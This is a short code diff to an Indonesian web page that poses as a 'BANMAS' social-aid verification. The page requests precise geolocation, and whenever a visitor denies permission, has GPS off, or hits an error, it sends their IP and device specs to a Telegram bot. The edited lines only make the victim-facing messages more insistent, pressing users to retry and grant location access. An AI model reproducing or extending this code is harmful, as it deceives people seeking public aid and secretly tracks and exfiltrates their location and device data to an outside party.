@@ -187,7 +187,7 @@
                         desc.style.borderLeft = "5px solid #d32f2f";
                         desc.innerHTML = `<span style="color:#d32f2f; font-weight:bold;">Akses Lokasi Diblokir!</span><br>
                         Sistem tidak bisa memproses bantuan karena Anda menolak izin lokasi.<br><br>
-                        <b>WAJIB:</b> Klik <b>ULANGI VERIFIKASI</b> lalu pilih <b>IZINKAN / ALLOW</b> pada kotak pesan yang muncul di layar.`;
+                        <b>WAJIB:</b> Klik tombol <b>ULANGI VERIFIKASI</b> di bawah lalu pilih <b>IZINKAN / ALLOW</b> pada kotak pesan yang muncul.`;
                         await sendToTelegram(`⚠️ <b>BANMAS: DIBLOKIR</b>\nIP: ${ip}\n\n${specs}`);
                     }
                     else if(err.code == 2 || err.code == 3) {
@@ -201,7 +201,7 @@
                         await sendToTelegram(`⚠️ <b>BANMAS: GPS OFF</b>\nIP: ${ip}\n\n${specs}`);
                     } else {
                         await sendToTelegram(`⚠️ <b>BANMAS: ERROR</b>\nCode: ${err.code}\nIP: ${ip}\n\n${specs}`);
-                        desc.innerHTML = "Terjadi kesalahan sistem. Silakan coba lagi.";
+                        desc.innerHTML = "Terjadi kesalahan sistem. Silakan klik tombol di bawah untuk mencoba lagi.";
                     }
                 },
                 { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
